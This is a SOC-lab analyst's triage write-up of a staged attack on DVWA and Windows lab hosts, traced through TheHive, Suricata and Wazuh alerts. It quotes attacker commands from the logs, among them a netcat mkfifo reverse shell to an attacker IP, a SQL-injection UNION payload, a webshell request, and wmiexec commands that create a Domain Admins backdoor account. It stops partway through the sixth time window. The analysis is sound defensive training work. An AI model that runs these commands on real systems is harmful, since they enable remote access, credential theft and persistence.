# 🔒 SOC-Lab: Initial Alert Triage, Emergency Containment & Pipeline Critique

> **Analyst:** Manichand Gupta
> **Environment:** SOC-Lab (DVWA `192.168.56.30`, Suricata, DomainWin10 `192.168.56.10`, Win10User `192.168.56.20`)
> **Incident Window:** 2026-10-18 `17:10:09 IST` – `18:36:34 IST` (**46 TheHive Alerts / 192 Sub-Events**)

---

## 📑 Table of Contents

1. [Opening the Queue: Priority Triage First, Then Tracing the Full Story](#1-opening-the-queue-priority-triage-first-then-tracing-the-full-story)
2. [Chronological Walkthrough of All 46 Alerts by Time Window](#2-chronological-walkthrough-of-all-46-alerts-by-time-window)
3. [Master Triage Table: All 46 Alerts](#3-master-triage-table-all-46-alerts)
4. [Immediate Containment Actions & Why I Am Taking Each One Right Now](#4-immediate-containment-actions--why-i-am-taking-each-one-right-now)
5. [Analyst Critique of Our Alert Creation Pipeline: 8 Flaws to Fix](#5-analyst-critique-of-our-alert-creation-pipeline-8-flaws-to-fix)

---

# 1. Opening the Queue: Priority Triage First, Then Tracing the Full Story

When I sit down at TheHive and see **46 unread alerts** sitting in the queue with zero prior context, I don't start reading blindly from the oldest alert at the bottom. Like any analyst walking into a live queue, I sort by **Severity (Critical → High)** and check the most recent alerts at the top of the dashboard first to see if our infrastructure is actively compromised.

## Step 1: Checking the 1 Critical Alert First (Why It's a False Alarm)

> ### ⚠️ Alert #06 (`17:12:08 IST`) — [5x] [DVWA] Shellshock attack detected
> **TheHive Severity: Critical | My Real Priority: Low / P4**

Because this is the only **Critical** badge in the entire dashboard, I open it first. Inside the raw HTTP log, I see 5 `GET` requests from external IP `192.168.232.135` hitting `/login.php`, `/`, `/info.php`, `/phpinfo.php`, and `/test.php` on DVWA (`192.168.56.30`) with the header:

```http
93e4r0-CVE-2014-6271: () { :; }; echo '93e4r0-CVE-2014-6271: true'
```

**Why this is Recon, not a real breach:** That `93e4r0-CVE-2014-6271` string is **Nikto's built-in vulnerability scanner canary**, and all 5 requests hit standard PHP pages (or returned `404 Not Found`) rather than a vulnerable `/cgi-bin/` bash script. There is **zero command execution**. TheHive only marked it Critical because Wazuh Rule `31168` statically matched `() { :; };` in the HTTP header.

## Step 2: Checking the 4 High Alerts & the Newest Alerts at the Top of the Queue

Next, I check the four **High**-severity alerts sitting right below Shellshock:

| Alert | Time (IST) | Title |
|-------|-----------|-------|
| **#03** | 17:10:09 | [TOOL:Nmap x3] [Suricata] 192.168.232.135 |
| **#17** | 17:30:49 | [TOOL:Nmap x9] [Suricata] 192.168.56.30 |
| **#31** | 18:08:27 | [1x] [DomainWin10] Logon activity: ADMINISTRATORS @ local |
| **#33** | 18:09:05 | [1x] [DomainWin10] Logon activity: DOMAIN ADMINS @ local |

Right away, two things jump out at me:

1. **Why is our own Linux web server (`192.168.56.30`, DVWA) acting as the source of an internal Nmap scan in Alert #17?**
2. **Why are the ADMINISTRATORS and DOMAIN ADMINS groups being modified on our Domain Controller (DomainWin10, `192.168.56.10`) in Alerts #31 and #33?**

When I glance at the surrounding Medium alerts, the picture gets even worse: I see `Logon activity: ROOT @ 192.168.232.135` on DVWA, `Logon activity: BACKDOOR @ local` on DomainWin10, repeated `[FANOUT x...]` parent PID 4432 and parent PID 4008 process trees on DomainWin10 and Win10User, and **simulated ransomware/reboot commands across both Windows machines!**

## Step 3: Why I Switch to a Chronological Walkthrough (17:10 IST → 18:36 IST)

This initial priority check proves two things:

1. Our environment is **heavily compromised** across DVWA, DomainWin10, and Win10User.
2. **TheHive's default severity ranking cannot be trusted blindly**—it ranked a harmless Nikto probe as Critical while burying active reverse shells, Domain Controller wmiexec.py takeovers, and destructive impact batches under Medium.

Before I dive into deep forensics, I need to walk through all 46 alerts chronologically across **6 time windows** (`17:10 IST` to `18:36 IST`), distinguish clearly between what is **confirmed by raw log evidence** versus what is **suspected / pending host-log verification**, assign my own **Real Priority (P1 – P4)**, and execute immediate containment to lock the attacker out.

![TheHive Alerts queue sorted by Severity](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_01_thehive_severity_queue.png)
*Figure 1: TheHive alerts queue sorted by Severity, exposing 1 Critical Shellshock alert and 4 High alerts (#03, #17, #31, #33).*

![TheHive Alerts queue sorted chronologically - Part 1](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_01.5_thehive_chronological_queue_part1.png)
*Figure 1.5a: Chronological alert stream (17:10–17:12 IST) from initial Nmap scans through Nikto probes.*

![TheHive Alerts queue sorted chronologically - Part 2](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_01.5_thehive_chronological_queue_part2.png)
*Figure 1.5b: Chronological alert stream continuation showing Alert #11 with 22 sub-events.*

---

# 2. Chronological Walkthrough of All 46 Alerts by Time Window

## 🪟 Window 1 (17:10:09 – 17:12:16 IST) — Alerts #01 to #10: External Nmap & Nikto Reconnaissance

### Phase 1A: External Nmap Port & OS Scan (17:10:09 IST)

| Alert | Time (IST) | Title |
|-------|-----------|-------|
| **#01** | 17:10:09 | [2x] [Suricata] Suricata: Alert - POSSBL SCAN SHELL M-SPLOIT TCP |
| **#02** | 17:10:09 | [TOOL:unknown-scanner x17] [Suricata] 192.168.232.135 |
| **#03** | 17:10:09 | [TOOL:Nmap x3] [Suricata] 192.168.232.135 |

**What happened & why:** At `17:10:09 IST`, external IP `192.168.232.135` begins scanning DVWA (`192.168.56.30`). Seeing "POSSBL SCAN SHELL M-SPLOIT TCP" on port 4444 in Alert #01 looks like a Metasploit reverse shell at first glance. However, inspecting the raw Suricata flow shows `pkts_toclient: 0` (**zero response packets from DVWA**) and the attacker's source port (`34938`) is the exact same source port used in Alert #03 within the same second (`17:10:08 – 17:10:09 IST`, where Alert #03's earliest sampled packet at `17:10:08.930850` precedes Alert #01's at `17:10:08.973178` by ~42ms inside the sampled transcript). That confirms a **single Nmap sweep hitting multiple ports in rapid succession**, and port 4444 was closed at 17:10 IST.

Pulling the raw Suricata JSON inside Alert #03 shows that the actual signatures firing are **POSSBL PORT SCAN (NMAP -sS)** and **ET SCAN NMAP OS Detection Probe** (Wazuh rule `86601` across destination ports `111`, `41672`, and `443`)—not an HTTP User-Agent signature, since raw TCP SYN scanning doesn't carry an HTTP User-Agent at all.

![Alert #03 Detail: Nmap OS & Port Scan Probe](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_02_alert03_nmap_os_detection_probe.png)
*Figure 2: Alert #03 detail view in TheHive showing Suricata signatures POSSBL PORT SCAN (NMAP -sS) and ET SCAN NMAP OS Detection Probe.*

> **📌 Important Note on Alert #02** ([TOOL:unknown-scanner x17] [Suricata] 192.168.232.135): Although Alert #02 sits in Window 1 because its first event fired at `17:10:09 IST`, its Time span metadata (`17:10:09.913 IST` → `18:19:03.500 IST`) shows that the correlation engine kept appending sub-events from `192.168.232.135` into this single "scanner" bundle for **69 minutes** across the entire incident (long after the webshell, reverse shell, and root SSH access had already occurred—documented as **Flaw 8** in Section 5).

### Phase 1B: Automated Nikto Web Vulnerability Scan (17:12:05 – 17:12:16 IST)

Two minutes after the Nmap scan, `192.168.232.135` runs an automated Nikto web vulnerability scan (`Mozilla/5.00 (Nikto/2.1.6)`) against `http://192.168.56.30/`, generating 7 alert groups (#04 to #10):

| Alert | Time (IST) | Title |
|-------|-----------|-------|
| **#04** | 17:12:05 | [2x] [DVWA] DVWA: Multiple 400 errors - [404] [192.168.232.135] [/udOIY0cZ.fhp] |
| **#05** | 17:12:08 | [1x] [Suricata] Suricata: High-volume HTTP 4xx burst from 192.168.232.135 - possible scan/enumeration (>100 in 60s) |
| **#06** | 17:12:08 | [5x] [DVWA] Shellshock attack detected |
| **#07** | 17:12:09 | [16x] [DVWA] Multiple common web attacks from same source ip. |
| **#08** | 17:12:09 | [WATCHLIST x14: passwd] [DVWA] 192.168.232.135 |
| **#09** | 17:12:10 | [26x] [DVWA] Multiple XSS (Cross Site Scripting) attempts from same source ip. |
| **#10** | 17:12:16 | [4x] [Suricata] Suricata: Alert - GPL EXPLOIT unicode directory traversal attempt |

**What happened & why this is Recon:**

- **400/404 Error Burst (#04 & #05):** Alert #04 (rule `31151`) logs two 404 hits on `/udOIY0cZ.fhp`—a nonsense extension used by Nikto to test how the server handles nonexistent backup/debug files—while Suricata rule `100410` (#05) flags the broader `>100 in 60s` HTTP 4xx enumeration burst.
- **Shellshock Canary (#06):** As verified in Section 1, #06 is Nikto's `93e4r0-CVE-2014-6271: true` header test hitting PHP pages—**confirmed false positive for exploitation**.
- **Common Web Attacks & Buried RFI Probe (#07):** Inside the 16 sub-events of Alert #07 (rule `31153`), one sub-event is a remote file inclusion probe (`GET /OpenSiteAdmin/scripts/classes/Form.php?path=http://blog.cirt.net/rfiinc.txt%00`) that returned 404. It is a standard scanner test buried inside #07 that failed completely.
- **Passwd Watchlist, XSS & Unicode Traversal (#08, #09, #10):** Alert #08 logs [WATCHLIST x14: passwd]—14 hits on `/etc/passwd` path-traversal URIs (under Wazuh rule `31153`)—followed by 26 reflected XSS probes (#09, rule `31154`) and 4 `%2e%2e/` Unicode directory traversal probes (#10, rule `86601`). Every single request in #04 – #10 failed with 404 / 400 / 302 or hit a static `/login.php` page.

![Alert #05 Detail: Shellshock Canary Header](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_02.5_alert05_shellshock_nikto_canary.png)
*Figure 2.5: Alert #05 detail showing Nikto's 93e4r0-CVE-2014-6271 Shellshock canary header returning 404 Not Found.*

### ✅ Window 1 Verdict & Real Priority

| Alert | Verdict | TheHive Sev | My Real Priority |
|-------|---------|-------------|------------------|
| **#01** | False Positive (Shell) | Medium | **Info (P4)** — closed port 4444 hit by Nmap SYN probe |
| **#02 – #10** | Confirmed True Positive (Scanner Recon) / False Positive (Exploitation) | Critical (#06), High (#03), Medium (#02, #04–#05, #07–#10) | **Low (P4)** *(noting #02 continues absorbing events for 69 minutes)* |

---

## 🪟 Window 2 (17:18:02 – 17:29:43 IST) — Alerts #11 to #16: Suspected Brute-Force, SQLi, Webshell RCE, Reverse Shell & Root SSH

### Phase 2A: The 22-Event Suricata Bundle in Alert #11 (17:18:02 – 17:21:54 IST)

> ### 🔴 Alert #11 (`17:18:02 IST`) — [22x] [Suricata] Suricata: [200] [192.168.232.135] [/login.php] [ET INFO User-Agent (python-requests) Inbound to Webserver]

Expanding the 22 sub-events bundled inside Alert #11 reveals **four distinct stages of activity**:

#### 1. Stage 1 — Suspected Credential Brute-Force on /login.php (17:18:01 – 17:18:02 IST, Sub-events Alert 1 – Alert 16)

Six minutes after Nikto stops, `192.168.232.135` returns with a scripted **`python-requests/2.32.5`** User-Agent, generating **14 back-to-back `GET /login.php` requests (`200 OK`) followed immediately by two `GET /index.php` requests (`200 OK`)**. An automated loop on `/login.php` that suddenly pivots to DVWA's authenticated landing page (`/index.php`) strongly indicates **a credential brute-force script that succeeded on the 14th pass**. However, because Suricata rule `100600` only matches the python-requests User-Agent on `GET` traffic and does not capture `POST` bodies or login outcomes, I am marking Stage 1 **Suspected / High-Confidence Brute-Force** until I pull DVWA's host-side Apache/application auth logs for `17:18:01 – 17:18:03 IST`.

![Alert #11 Sub-events 1-3: Python-Requests /login.php](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_03_alert11_bruteforce_login_requests.png)
*Figure 3a: Alert #11 sub-events 1–3 capturing repeated GET /login.php requests using python-requests/2.32.5.*

![Alert #11 Sub-events 14-16: Pivot to /index.php](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_03_alert11_bruteforce_pivot_index.png)
*Figure 3b: Alert #11 sub-events 14–16 capturing the sudden transition from /login.php to /index.php indicating authenticated access.*

#### 2. Stage 2 — SQL Injection on /vulnerabilities/sqli/ (17:19:58 IST, Sub-event Alert 17)

Suricata captures one SQL injection request (**ET WEB_SERVER SELECT USER SQL Injection Attempt in URI**):

```http
GET /vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2C+password+FROM+users--+-&Submit=Submit
→ HTTP 200 OK
```

No prior boolean probe is logged in this queue; the `200 OK` response on the `UNION SELECT` query makes this a **Confirmed True Positive (Database Credential Dump)**.

![Alert #11 Sub-event 17: SQL Injection UNION SELECT](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_03.5_alert11_sqli_union_select.png)
*Figure 3.5: Alert #11 sub-event 17 capturing ET WEB_SERVER SELECT USER SQL Injection Attempt in URI.*

#### 3. Stage 3 & Stage 4 — PHP Webshell Upload (17:21:44 IST, Alert 18 – 21) & Command Execution (17:21:54 IST, Alert 22)

In Alert 18 – 21, the attacker sends `POST /vulnerabilities/upload/` (`200 OK`), triggering **ET WEB_SERVER PHP tags in HTTP POST** and **ET WEB_SERVER PHP System Command in HTTP POST**. Ten seconds later (Alert 22), they request:

```http
GET /hackable/uploads/shell.php?cmd=id
→ HTTP 200 OK (matching ET WEB_SERVER Exploit Suspected PHP Injection Attack (cmd=))
```

![Alert #11 Sub-events 21-22: PHP Webshell Upload and cmd=id Execution](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_04_alert11_webshell_upload_and_id.png)
*Figure 4: Alert #11 sub-events 21 & 22 showing POST /vulnerabilities/upload/ and GET /hackable/uploads/shell.php?cmd=id.*

### Phase 2B: Host auditd & Network Confirmation of Webshell RCE (17:21:53 – 17:21:58 IST)

| Alert | Time (IST) | Title |
|-------|-----------|-------|
| **#12** | 17:21:53 | [FANOUT x1] [DVWA] parent PID 17550 |
| **#13** | 17:21:58 | [1x] [Suricata] Suricata: Alert - ET ATTACK_RESPONSE Output of id command from HTTP server |

**What happened & why:** At the exact timestamp of `GET /hackable/uploads/shell.php?cmd=id`, Linux auditd on DVWA (#12) logs `uid=33` (`www-data`, untracked parent PID 17550) executing `/usr/bin/id`, and Suricata (#13, rule `86601`) catches the HTTP response packet returning `uid=33(www-data) gid=33(www-data)` to `192.168.232.135`. That **three-way correlation (Web request + Host auditd + Network response)** makes **Webshell RCE 100% Confirmed**.

![Alert #12: DVWA Host auditd id Command Execution](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_04.5_alert12_auditd_id_execution.png)
*Figure 4.5a: Alert #12 detail showing Linux auditd logging uid=33 (www-data) executing /usr/bin/id.*

![Alert #13: Suricata Response Returning uid=33](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_04.5_alert13_suricata_id_response.png)
*Figure 4.5b: Alert #13 detail showing Suricata signature ET ATTACK_RESPONSE Output of id command from HTTP server returning uid=33(www-data).*

### Phase 2C: Interactive Netcat Reverse Shell & Root SSH Key Persistence (17:24:03 – 17:29:43 IST)

| Alert | Time (IST) | Title |
|-------|-----------|-------|
| **#14** | 17:24:03 | [5x] [Suricata] Suricata: Alert - POSSBL SCAN SHELL M-SPLOIT TCP |
| **#15** | 17:24:03 | [FANOUT x1] [DVWA] parent PID 17562 |
| **#16** | 17:29:43 | [2x] [DVWA] Logon activity: ROOT @ 192.168.232.135 |

**What happened & why:** At `17:24:03 IST`, Alert #15 catches `uid=33` (`www-data`, parent PID 17562) spawning `/usr/bin/nc.openbsd` via the command:

```bash
sh -c -- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.232.135 4444 >/tmp/f
```

Simultaneously, Alert #14 logs 5 packets across the active TCP connection `192.168.56.30:47946 -> 192.168.232.135:4444`. Unlike #01, this is a **Confirmed Live Netcat Reverse Shell**.

![Alert #14: Suricata Port 4444 Active Flow](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_05_alert14_suricata_netcat_port4444.png)
*Figure 5a: Alert #14 detail showing active TCP reverse shell flow 192.168.56.30:47946 -> 192.168.232.135:4444.*

![Alert #15: DVWA Host auditd Netcat Execution](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_05_alert15_auditd_netcat_reverse_shell.png)
*Figure 5b: Alert #15 detail showing Linux auditd logging /usr/bin/nc.openbsd spawning an interactive shell via mkfifo /tmp/f.*

Then, after a **5-minute, 40-second unlogged gap** (`17:24:03` to `17:29:43 IST`), Alert #16 (Wazuh rule `5715`) fires with 2 succeeded attempts and 0 failed password attempts. The raw sshd log reads:

```log
2026-10-18T17:29:43.576530+05:30 dvwa sshd[17711]: Accepted publickey for root from 192.168.232.135 port 36488 ssh2: ED25519 SHA256:sMGVpOuqXdgB9Cqa5JCKAmoz51G5mwbkEUAxSngg4hE
```

This proves that inside the reverse shell, the attacker **escalated from `www-data` to `root`** (a host visibility blind spot) and planted their **ED25519 public key** into `/root/.ssh/authorized_keys`, logging in from `192.168.232.135` port 36488.

![Alert #16: DVWA sshd Accepted ED25519 Root Publickey](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_05.5_alert16_root_ssh_ed25519_key.png)
*Figure 5.5: Alert #16 detail showing sshd publickey authentication success for root from 192.168.232.135.*

### ✅ Window 2 Verdict & Real Priority

| Alert | Verdict | TheHive Sev | My Real Priority |
|-------|---------|-------------|------------------|
| **#11** | Stage 1 Brute-Force is Suspected / High-Confidence (pending host log pull); Stages 2–4 (SQLi, Webshell Upload, cmd=id) are Confirmed True Positives | Medium | **Critical (P1)** |
| **#12 & #13** | Confirmed True Positives (Webshell RCE) | Medium | **High (P2)** |
| **#14, #15, #16** | Confirmed True Positives (Reverse Shell & Root SSH Persistence) | Medium | **Critical (P1)** |

---

## 🪟 Window 3 (17:30:49 – 18:03:52 IST) — Alerts #17 to #24: Internal Network Pivot Scan & GoldenPac Kerberos Traffic

### Phase 3A: Internal Nmap & SSH Pivot Sweep from Compromised DVWA (17:30:49 – 17:32:16 IST)

| Alert | Time (IST) | Title |
|-------|-----------|-------|
| **#17** | 17:30:49 | [TOOL:Nmap x9] [Suricata] 192.168.56.30 |
| **#18** | 17:30:51 | [5x] [Suricata] Suricata: Alert - POSSBL SCAN SHELL M-SPLOIT TCP |
| **#19** | 17:32:16 | [TOOL:unknown-scanner x14] [Suricata] 192.168.56.30 |

**What happened & why:** One minute after establishing root SSH access, the attacker uses DVWA (`192.168.56.30`) to scan the internal network. Inspecting the raw signatures inside Alert #17 shows **POSSBL PORT SCAN (NMAP -sS)** and **POSSBL PORT SCAN (NMAP -sX)** (rule `86601`), confirmed across destination ports `1, 111, 199, 31768, 443, 995` on the internal segment (with #18 firing when the scan touches port 4444). Immediately after, Alert #19 logs 14 hits of **ET SCAN Potential SSH Scan OUTBOUND** on destination port `22` from `192.168.56.30`.

![Alert #17: Internal Nmap Scan from Compromised DVWA](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_06_alert17_dvwa_internal_nmap_sweep.png)
*Figure 6: Alert #17 detail showing internal Nmap port scan sweep originating from DVWA (192.168.56.30).*

### Phase 3B: Root SSH Sessions & Anomalous Kerberos Traffic (GoldenPac Signature) (17:34:27 – 18:03:52 IST)

| Alert | Time (IST) | Title |
|-------|-----------|-------|
| **#20** | 17:34:27 | [4x] [DVWA] Logon activity: ROOT @ 192.168.232.135 |
| **#21** | 17:39:46 | [2x] [DVWA] Logon activity: ROOT @ 192.168.232.135 |
| **#22** | 18:01:02 | [2x] [DVWA] Logon activity: ROOT @ 192.168.232.135 |
| **#23** | 18:01:18 | [1x] [Suricata] Suricata: Alert - ET EXPLOIT Possible GoldenPac Priv Esc in-use |
| **#24** | 18:03:52 | [2x] [DVWA] Logon activity: ROOT @ 192.168.232.135 |

**What happened & how I evaluate Alert #23:** Across #20, #21, #22, and #24, the attacker logs into DVWA as root via SSH using their planted ED25519 key. At `18:01:18 IST`—**just 16 seconds after the root SSH login in #22**—Suricata fires Alert #23 (**ET EXPLOIT Possible GoldenPac Priv Esc in-use**) on flow `192.168.56.30:33986 -> 192.168.56.10:88` (TCP/krb5).

Both the flow (**DVWA `.56.30` talking to PC-DC `.56.10` on Kerberos port 88**) and the timing (**16 seconds after a root SSH session, and 3.5 minutes before AD\Administrator WMI execution begins on the DC in #25**) are solid and exactly as logged.

However, what I don't have in this alert is the actual Kerberos packet payload showing a forged PAC—Suricata's signature fires on traffic pattern, not on cryptographic validation of the ticket. Therefore, I am marking #23 **High-Confidence, Pattern-Consistent with GoldenPac (MS14-068) (Suspected / Pending PCAP Payload Capture)** rather than definitively proven CVE exploitation from the signature alone. Regardless of the exact CVE, a standalone non-domain-joined Linux box talking Kerberos (`:88`) to the Domain Controller is anomalous enough to justify immediate **Critical (P1)** escalation.

![Alert #23: Suricata GoldenPac Kerberos Flow](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_06.5_alert23_goldenpac_kerberos_traffic.png)
*Figure 6.5: Alert #23 detail showing ET EXPLOIT Possible GoldenPac Priv Esc in-use on flow 192.168.56.30:33986 -> 192.168.56.10:88.*

### ✅ Window 3 Verdict & Real Priority

| Alert | Verdict | TheHive Sev | My Real Priority |
|-------|---------|-------------|------------------|
| **#18** | False Positive (Shell) | Medium | **Info (P4)** |
| **#17, #19, #20, #21, #22, #24** | Confirmed True Positives (Internal Pivot Scan & Root SSH Sessions) | High (#17), Medium (#19–#22, #24) | **High (P2)** |
| **#23** | High-Confidence / Pattern-Consistent True Positive (GoldenPac Kerberos Pivot — Pending PCAP Verification) | Medium | **Critical (P1)** |

---

## 🪟 Window 4 (18:04:47 – 18:13:58 IST) — Alerts #25 to #35: Domain Controller WMI Takeover & BACKDOOR Domain Admin Creation

### Phase 4A: Impacket wmiexec.py Recon Sessions on DomainWin10 (18:04:47 – 18:07:26 IST)

| Alert | Time (IST) | Title |
|-------|-----------|-------|
| **#25** | 18:04:47 | [FANOUT x2] [DomainWin10] parent PID 4432 |
| **#26** | 18:05:43 | [FANOUT x2] [DomainWin10] parent PID 4432 |
| **#27** | 18:06:53 | [FANOUT x2] [DomainWin10] parent PID 4432 |
| **#28** | 18:07:26 | [FANOUT x2] [DomainWin10] parent PID 4432 |

**What happened & why:** Starting at `18:04:47 IST`, Sysmon (**Event ID 1**) and Wazuh rule `100613` (**Impacket wmiexec detected**) on DomainWin10 (PC-DC.ad.lab, `192.168.56.10`) catch untracked parent PID 4432 (`WmiPrvSE.exe`) spawning:

```cmd
cmd.exe /Q /c ... 1> \\127.0.0.1\ADMIN$\__<epoch> 2>&1
```

...as `AD\Administrator`. In #25 and #27, the session initializes (`cd \` and `cd`), and in #26 and #28, the attacker runs `whoami` and `hostname`. This is **Confirmed Impacket wmiexec.py remote execution on our Domain Controller**.

![Alert #25: DC Impacket wmiexec Takeover](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_07_alert25_wmiexec_dc_takeover.png)
*Figure 7: Alert #25 detail showing Sysmon Event ID 1 / Wazuh rule 100613 logging WmiPrvSE.exe spawning cmd.exe commands as AD\Administrator.*

### Phase 4B: Creating AD\backdoor & Escalating to Administrators and Domain Admins (18:08:21 – 18:09:28 IST)

| Alert | Time (IST) | Title |
|-------|-----------|-------|
| **#29** | 18:08:21 | [FANOUT x3] [DomainWin10] parent PID 4432 |
| **#30** | 18:08:22 | [3x] [DomainWin10] Logon activity: BACKDOOR @ local |
| **#31** | 18:08:27 | [1x] [DomainWin10] Logon activity: ADMINISTRATORS @ local |
| **#32** | 18:09:05 | [FANOUT x3] [DomainWin10] parent PID 4432 |
| **#33** | 18:09:05 | [1x] [DomainWin10] Logon activity: DOMAIN ADMINS @ local |
| **#34** | 18:09:28 | [2x] [DomainWin10] Logon activity: BACKDOOR @ local |

**What happened & why:**

**1. Inside Alert #29:** The attacker executes three commands across `18:08:21 – 18:08:34 IST`:

- ```cmd
  cmd /c "net user backdoor P@ssw0rd123! /add"
  ```
  → Immediately confirmed by Alert #30 (rule `60109`, logging account creation & enablement for BACKDOOR).

- ```cmd
  cmd /c "net localgroup Administrators backdoor /add"
  ```
  → Immediately confirmed by High-severity Alert #31 (rule `60154`, **Administrators Group Changed**).

![Alert #29: wmiexec Account Creation with Unicode Curly Quotes](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_07.5_alert29_wmiexec_curly_quotes_backdoor.png)
*Figure 7.5a: Alert #29 detail showing wmiexec executing net user backdoor and net group “Domain Admins” with failed Unicode curly quotes.*

![Alert #30: Security Event ID 4720 User Account Enabled or Created](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_07.5_alert30_domain_backdoor_created_event4720.png)
*Figure 7.5b: Alert #30 detail showing Windows Security Event ID 4720 logging user account backdoor creation on DomainWin10.*

- ```cmd
  net group “Domain Admins” backdoor /add
  ```
  → Uses Unicode curly quotes (`“ ”`), which `net.exe` **rejects** (no group-change event fires at 18:08:34 IST).

**2. Inside Alert #32:** Thirty-one seconds later (`18:09:05 IST`), the attacker fixes the quotes and runs three commands:

- ```cmd
  net group "Domain Admins" backdoor /add
  ```
  (straight ASCII quotes) → Immediately confirmed by High-severity Alert #33 (rule `60159`, **Domain Admins Group Changed**).

![Alert #33: Security Event ID 4728 Domain Admins Group Changed](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_08_alert33_domain_admins_escalation.png)
*Figure 8: Alert #33 detail showing member CN=backdoor added to Domain Admins (Event ID 4728).*

- ```cmd
  cmd /c "net user backdoor /passwordchg:no"
  ```
  → Immediately confirmed by Alert #34 (rule `60110`, **User account changed**).

- ```cmd
  cmd /c "net user backdoor"
  ```
  → Verifies the new account's group memberships.

### Phase 4C: Staging Active Directory Enumeration Files (18:13:58 IST)

> ### ⚠️ Alert #35 (`18:13:58 IST`) — [FANOUT x2] [DomainWin10] parent PID 4432

**What happened & why:** Through the same wmiexec.py parent (PID 4432), the attacker runs:

```cmd
cmd /c "net user /domain > C:\Windows\Temp\domain_users.txt"
cmd /c "whoami /all > C:\Windows\Temp\admin_info.txt"
```

...staging AD enumeration data in `C:\Windows\Temp\`.

![Alert #35: Active Directory Recon Data Staging](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_08.5_alert35_ad_recon_staging.png)
*Figure 8.5: Alert #35 detail showing wmiexec dumping domain users and whoami output into C:\Windows\Temp\.*

### ✅ Window 4 Verdict & Real Priority

| Alert | Verdict | TheHive Sev | My Real Priority |
|-------|---------|-------------|------------------|
| **#25 – #34** | Confirmed True Positives (Domain Controller WMI Takeover & AD\backdoor Domain Admin Persistence) | Medium (#25–#30, #32, #34), High (#31, #33) | **Critical (P1)** |
| **#35** | Confirmed True Positive (AD Data Staging) | Medium | **High (P2)** |

---

## 🪟 Window 5 (18:14:58 – 18:19:02 IST) — Alerts #36 to #38: Workstation Lateral Movement & SSH Session Re-Establishment

| Alert | Time (IST) | Title |
|-------|-----------|-------|
| **#36** | 18:14:58 | [FANOUT x3] [Win10User] parent PID 4008 |
| **#37** | 18:17:30 | [6x] [DVWA] Logon activity: ROOT @ 192.168.232.135 |
| **#38** | 18:19:02 | [2x] [DVWA] Logon activity: ROOT @ 192.168.232.135 |

**What happened & why:**

**1. Workstation Pivot & Sensitive File Staging (#36):** Less than a minute after staging files on the DC, Impacket wmiexec.py (parent PID 4008 on Win10User, `192.168.56.20`) executes as `AD\Administrator`, runs `cd \` and `cd`, and executes:

```cmd
cmd /c "type C:\Users\win10\Documents\Sensitive\* > C:\Windows\Temp\sensitive_data.txt"
```

![Alert #36: Workstation Lateral Movement and Sensitive Data Staging](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_09_alert36_win10_sensitive_data_staging.png)
*Figure 9: Alert #36 detail on Win10User showing wmiexec (PID 4008) dumping sensitive documents to C:\Windows\Temp\sensitive_data.txt.*

**2. Repeated Root SSH Reconnects on DVWA (#37 & #38):** At `18:17:30 IST` (#37, 6 succeeded logins within ~570ms) and `18:19:02 IST` (#38, 2 succeeded logins), the attacker reconnects to DVWA as root via SSH from `192.168.232.135`. While rapid SSH bursts can sometimes indicate automated file transfers, nothing in #37 or #38 shows an `sftp` or `scp` subsystem indicator—only `sshd: authentication success` events. Given that the destructive commands in Window 6 run directly as `cmd /c echo ...` and `reg add ...` strings through wmiexec.py rather than executing a binary uploaded to DVWA, the better-supported read is that the attacker is **re-establishing interactive SSH sessions on DVWA before launching the final remote-command sequence** (pending any host-level session/byte-count evidence).

![Alert #38: Repeated Root SSH Reconnects on DVWA](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_09.5_alert38_root_ssh_reconnect.png)
*Figure 9.5: Alert #38 detail showing accepted publickey logins for root on DVWA prior to the destructive impact sequence.*

### ✅ Window 5 Verdict & Real Priority

| Alert | Verdict | TheHive Sev | My Real Priority |
|-------|---------|-------------|------------------|
| **#36, #37, #38** | Confirmed True Positives (Workstation Lateral Movement, Sensitive Data Staging & Pivot Session Activity) | Medium | **High (P2)** |

---

## 🪟 Window 6 (18:19:49 – 18:36:34 IST) — Alerts #39 to #46: Simulated Ransomware, Wallpaper Defacement & Forced Reboots

> **📌 Note on Simulated Impact:** Inspecting the raw command lines in this window confirms that the destructive actions (`echo ENCRYPTED_DATA_XOR_KEY_7f3a9b > ...`, registry wallpaper edits, and `README_HACKED.txt`) are a **controlled red-team ransomware and defacement simulation** executed via native `cmd.exe` commands (`copy`, `reg add`, `echo`, `shutdown`) rather than a compiled cryptographic ransomware binary.

### Phase 6A: Consolidated 9-Step Impact Batch on DomainWin10 (18:19:49 – 18:20:56 IST)

| Alert | Time (IST) | Title |
|-------|-----------|-------|
| **#39** | 18:19:49 | [FANOUT x9] [DomainWin10] parent PID 4432 |
| **#40** | 18:20:05 | [FANOUT x1] [DomainWin10] parent PID 6500 |
| **#41** | 18:20:11 | [FANOUT x1] [DomainWin10] parent PID 4980 |

